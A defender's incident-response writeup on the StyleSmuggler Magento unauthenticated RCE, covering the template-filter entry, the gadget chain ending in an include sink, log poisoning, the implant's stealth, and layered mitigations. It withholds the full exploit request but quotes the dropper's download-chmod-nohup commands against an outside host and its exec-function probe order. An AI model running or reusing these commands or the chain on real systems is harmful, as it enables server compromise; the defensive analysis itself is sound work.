# How StyleSmuggler works

> ### Read this before you run anything
>
> Written with AI assistance during a live incident response. Everything below was
> observed first-hand on two stores compromised on 5 September 2026, verified on a
> third that was targeted but not breached, and cross-checked against the
> [Sansec advisory](https://sansec.io/research/stylesmuggler). Where this goes
> beyond the advisory it says so.

A mechanical walkthrough of the Magento and Adobe Commerce unauthenticated RCE that
Sansec disclosed on 5 September 2026. It explains the mechanism end to end, so a
defender can reason about it and recognise variants, and so the patches in this
repository can say exactly what they fix.

It does not publish the assembled request that drives the chain. Sansec withheld the
full gadget chain when they disclosed, and with no vendor fix available that restraint
still holds. Every rule and patch here works without it.

---

## TL;DR

The attack feeds attacker-controlled text into Magento's template filter without
authenticating, and rides a chain of Magento's own classes until one of them runs
`include` on a file the attacker chose. That file is a log the attacker poisoned a
moment earlier. Two ordinary features, stacked, become remote code execution.

```
  1. attacker text reaches Magento's template filter    ← the front door
  2. hand it a {{block}} template directive             ← the language
  3. the directive drives an object-injection chain     ← the plumbing
  4. the chain ends in include $attacker_path           ← the sink
  5. that path is a log poisoned with PHP a second ago  ← the payload
  6. the executed PHP downloads and runs an implant     ← the outcome
```

Step 1 has no clean guard: the code that processes the text also renders every
legitimate email. So the shipped patch closes **step 4**, the sink, and the layers that
do not depend on the entry point (`disable_functions`, `noexec`) carry the rest.

---

## The full chain

```
  ATTACKER                       MAGENTO (PHP-FPM)                    FILESYSTEM
     │                                 │                                  │
     │ ① POST /graphql?type=2          │                                  │
     │    &text={{block class=...}}    │                                  │
     │    &styles[first]=              │                                  │
     │      ../var/log/system.log      │                                  │
     ├────────────────────────────────>│                                  │
     │                                 │                                  │
     │                    template filter runs the {{block}} in          │
     │                    text, via object injection (no route,           │
     │                    no auth) — NOT the admin preview block           │
     │                                 │                                  │
     │                    {{block class=...}} is parsed and the           │
     │                    named class is instantiated and driven          │
     │                    via styles[generatorClass] + with_resolved      │
     │                                 │                                  │
     │                    chain ends in ArrayScanner::collectEntities     │
     │                                 │  include $file                   │
     │                                 │<─────────────────────────────────┤
     │                                 │              var/log/system.log   │
     │                                 │              (poisoned in a       │
     │                                 │               prior request)      │
     │                          ┌──────┴───────┐                          │
     │                          │ PHP EXECUTES │                          │
     │                          │ the log file │                          │
     │                          └──────┬───────┘                          │
     │                                 │                                  │
     │                    payload probes exec functions,                  │
     │                    curls an implant, nohups it                     │
     │                                 │                                  │
     └─────────────────────────────────┴──────────────────────────────────┘
```

---

## Step 1: the entry — object injection, not a route

Be honest about a limit here. The request parameters `text`, `type` and `styles`
match the fields of one class exactly:

```
app/code/Magento/Email/Block/Adminhtml/Template/Preview.php
```

which reads `getParam('text')`, `getParam('type')` and `getParam('styles')` and runs
them through the template filter. That match is why an earlier version of this document
named it as the front door.

It is not the front door. That block has an **admin-only route** (`Adminhtml`, behind
auth), and no route connects `/graphql` to it. Traced statically: no non-admin
controller reads `text`, and no GraphQL resolver reads these parameters.

What actually processes the gadget is the **model**, not the block:

```php
// Magento\Email\Model\AbstractTemplate::getProcessedTemplate()
$result = $processor->filter($this->getTemplateText());   // runs {{block ...}}
// and, earlier:
$variables['template_styles'] = $this->getTemplateStyles();  // the styles gadget
```

`getProcessedTemplate` is reached through the object-injection chain rather than
through a route or a controller. The exact unauthenticated endpoint that feeds
attacker `text` into a template filter is the part Sansec withheld, and this writeup
does not reproduce it.

Sansec's 6 September update names the concrete trigger: StyleSmuggler deliberately fires
Magento's standard "Payment Transaction Failed Reminder" email, and **the code runs
while Magento renders that email**. Nobody has to open it, and the attack can succeed
even when delivery fails. That rendering path is `getProcessedTemplate`, which is why the
garbled "failed payment" mail (see [EARLY-WARNING-EMAIL.md](EARLY-WARNING-EMAIL.md)) is
both the trigger and the alert.

This shapes the defence. `getProcessedTemplate` renders every legitimate transactional
email too, so you cannot area-guard it or patch it shut without breaking mail — which is
why the shipped **patch** targets the sink instead. But the entry *can* be narrowed one
step earlier, at `setTemplateStyles`: legitimate template styles are always plain CSS, so
an application-layer plugin can reject a value containing `{{`, a PHP tag, or a
`\Namespace\` separator there without touching real mail. brideo's module does exactly
that (credited in the patches README). And `disable_functions` and `noexec`, which do not
depend on the entry point at all, carry the rest of the weight.

## Steps 2 and 3: the directive and the plumbing

`text` carries a `{{block}}` directive. Magento's template filter treats `{{block
class=Some\Class ...}}` as an instruction to instantiate `Some\Class` and call methods
on it. The `styles[...]` parameters supply the rest: which class to build
(`generatorClass`), which instance to resolve, which method to call
(`with_resolved[...][instance]`, `collectEntities`).

Chained together they walk Magento from the template filter into a class that was
never meant to see a web request.

## Step 4: the sink

The chain terminates here:

```php
// setup/src/Magento/Setup/Module/Di/Code/Scanner/ArrayScanner.php
public function collectEntities(array $files)   // $files is attacker-controlled
{
    foreach ($files as $file) {
        if (file_exists($file)) {
            $data = include $file;              // ← parses and executes $file
            $output = array_merge($output, $data);
        }
    }
}
```

`include` does not read a file. It parses and executes it. Log lines outside `<?php ?>`
echo as harmless output; the block the attacker planted runs.

Three classes in the DI compiler take a caller-supplied path and hand it to
`include`/`require`:

```
setup/src/Magento/Setup/Module/Di/Code/Scanner/ArrayScanner.php           include
setup/src/Magento/Setup/Module/Di/Code/Reader/ClassesScanner.php          require_once
setup/src/Magento/Setup/Module/Di/Code/Scanner/XmlInterceptorScanner.php  require_once
```

All three exist only to serve `bin/magento setup:di:compile`. None has any business
running during an HTTP request.

### The forensic tell

`include` returns `int(1)` for a file with no `return` statement. A poisoned log has
none, so the line after throws:

```
$data = include $file;                 → payload has ALREADY executed
$output = array_merge($output, $data); → array_merge(): Argument #2 must be
                                         of type array, int given
```

That TypeError in `system.log` is evidence the exploit **succeeded**, not that it
failed. On the store we handled the dropped binary appeared three seconds later. The
stealthier variant ends its payload with `return [];` so nothing throws and nothing
lands in the log.

## Step 5: the poison

Step 4 needs a file containing PHP. The attacker creates it a moment earlier by
sending input Magento rejects but logs verbatim:

```
what the attacker sends            what lands in the file
─────────────────────────          ──────────────────────────────────────
store code:                        [2026-09-05T...] main.CRITICAL:
  <?php /* payload */ ?>             Requested store is not found
                                     (<?php /* payload */ ?>)
```

Two known sinks, and variants differ in which they use:

```
var/log/system.log     an invalid store code, logged verbatim
var/report/<hash>       an uncaught exception's failure report
```

Both stores we cleaned were poisoned through `var/log/system.log`. Sansec's published
check looks at `var/report/`, so it would have missed both. Check both.

Step 5 is unfilterable. It is indistinguishable from a broken integration submitting
garbage, so no web-server rule can block it without breaking real traffic.

## Step 6: the outcome

The executed PHP is a dropper. It probes six functions in order and uses the first
that works:

```
shell_exec  →  exec  →  system  →  passthru  →  proc_open  →  popen
```

Then it downloads an architecture-matched implant, makes it executable, and detaches
it:

```
curl/wget https://247.cdnflare.xyz/files/kworker-linux-<arch>
chmod 755 /tmp/.kw_<random>
nohup /tmp/.kw_<random> &
```

The implant, ~1.9 MB of stripped static Rust, renames itself `[kworker/u:8:0]`,
relocates to `~/.local/share/.gvfsd/gvfsd-user`, and installs a `*/5` crontab entry.

### Why proc_open matters

The dropper's fifth probe is `proc_open`. On the store where the first four functions
were denied, it fell through to `proc_open` and spawned the implant anyway.
`open_basedir` does not help: once `proc_open` succeeds the child runs outside PHP
entirely, which is how the binary reached `~/.local/share/` while the pool was confined
to its docroot.

A `disable_functions` list that stops five of the six stops nothing. This was the
single missing entry that let one of the two compromises succeed.

---

## Why it hides so well

### The process name is camouflage

```
ps output                              what it really is
──────────────────────────────────    ─────────────────────────
root      12  0.0  [kworker/0:1]       genuine kernel thread
webuser 1724  0.1  [kworker/u:8:0] 3M  THE IMPLANT
```

Genuine kernel threads are always root-owned with no resident memory. A bracketed name
on a site uid with real RSS is the tell.

**Match on args, not comm.** A real kernel thread has an empty cmdline and `ps` adds
the brackets itself, so `comm` never contains them. The implant sets its cmdline to the
literal string `[kworker/u:8:0]`. A check written against `comm` matches nothing,
passes a clean-fleet test, and misses the implant.

### It may make no outbound connection at all

On one store the implant opened zero external sockets. It held 28 connections to
`127.0.0.1:6379`, reading and writing Magento's own Redis. Absence of suspicious
network traffic proves nothing. The C2 addresses in the advisory appeared in neither
of our 200 MB+ packet captures.

### Scanners look in the wrong place

```
/home/<user>/
  ├── .local/share/.gvfsd/gvfsd-user      ← implant lives HERE
  └── domains/<domain>/public_html/       ← scanners look HERE
```

A malware scanner scoped to the document root walks past it. On one store eComscan ran,
with its "Server background processes" and "Scheduled server tasks" checks enabled,
while the implant was live and 1728 malicious cron lines were present, and reported
clean.

### The crontab restores itself, invisibly

The persistence entry rewrites itself directly to `/var/spool/cron/crontabs/<user>`
rather than through the `crontab` command, so syslog records no `REPLACE`. One store
carried the same line 1728 times, re-appended within a second of removal. Clean cron,
kill the processes, remove the binary, then clean cron again, and verify after a full
cron cycle.

### The implant updates itself

On one store the binary running in memory hashed differently from the file on disk:
`/proc/<pid>/exe` pointed at a deleted inode. Hash the running process, not only the
file.

### The indicators drift within hours

The trigger header was `X-TRACE-<10 hex>` in the morning and `X-<10 hex>` (no `TRACE`)
by the afternoon of the same day. A detection pinned to the old form goes blind. Match
the shape, not the literal.

---

## Where the mitigations cut, and which one holds

```
①  poison a file             NOT FILTERABLE — looks like broken input
      │
      ▼
②  attacker text reaches       NO CLEAN GUARD — the model that processes
   the template filter            it renders every legitimate email too
      │
      ▼
③  {{block}} → gadget chain    (no single choke point — many gadgets exist)
      │
      ▼
④  include $file → RCE         ◄── SINK GUARD: DI scanners are CLI-only
      │                           closes the one sink we can name
      ▼
⑤  dropper spawns process      ◄── disable_functions incl. proc_open
      │                           vulnerability-independent: no exec, no implant
      ▼
⑥  binary runs from /tmp       ◄── noexec on /tmp, /var/tmp, /dev/shm
      │
      ▼
⑦  cron persistence            ◄── proc-watch: detect within 5 minutes
```

Not all layers are equal.

**The entry (②) has no clean guard.** The template processing the gadget drives also
renders every legitimate transactional email, so a check there breaks mail. The front
door cannot be locked without locking out the house.

**The sink guard (④) is therefore the shipped patch.** It closes the `include` the
gadget chain ends in. It is verified: `setup:di:compile` still runs, because it runs
from the CLI. If a future gadget reaches a DI scanner by another route, this still
holds. It is not a complete fix on its own — other sinks exist that cannot be guarded
(`Magento\Framework\View\TemplateEngine\Php` renders every page) — which is the
whole reason the next two layers matter.

**`disable_functions` with `proc_open` (⑤) is the one that does not depend on knowing
the vulnerability.** It does not matter which sink, which CVE, or which gadget. Without
the six exec functions PHP cannot start a process, so code execution never becomes a
running implant. This is the layer to get right first.

**The web-server rules are a speed bump, not a fix.** nginx and Apache only see the URL
query string. Every attack observed so far put the parameters there, so the rules stop
the current campaign. But PHP merges GET and POST into `$_REQUEST`, so the same
parameters in a POST body walk past them. Deploy them because they are free and stop
today's traffic; rely on the guards and `disable_functions`.

The sink guard ④ is shipped as a source patch in [`patches/`](patches/), applicable
via composer-patches and verified against 2.4.6 through 2.4.9. There is no entry-point
patch, for the reason in Step 1.

---

## Observed timeline

All times UTC, 4–5 September 2026, from two stores we handled.

```
04 Sep 22:20   Sansec: first confirmed StyleSmuggler exploitation, worldwide
04 Sep 23:10   Store A hit — 50 minutes later
04 Sep 23:14   Store A's Sansec Shield blocks an unrelated .env scan (it was awake)
05 Sep 07:15   Sansec Shield's first StyleSmuggler rules go live
05 Sep ~11:00  Store B hit
05 Sep 13:51   compromise confirmed
05 Sep 14:2x   both stores contained
05 Sep 15:08   Store A hit again, blocked at the web-server layer this time
05 Sep 17:08   Store A hit again with a changed trigger header, blocked
```

Both stores were breached in the eight-hour window between the first exploitation on
Earth and the moment any defence existed. No patch level and no signature could have
covered that window, which is the whole argument for the vulnerability-independent
layers above.

There is still no Adobe fix. Replace these mitigations with it when it ships.

## Scope

This document names the vulnerable entry point and sink, because a fix has to say what
it fixes and both are discoverable in Magento's own source. It does not publish the
assembled request that chains them. Credit for discovery, naming and the original
advisory belongs to the [Sansec](https://sansec.io) forensics team.
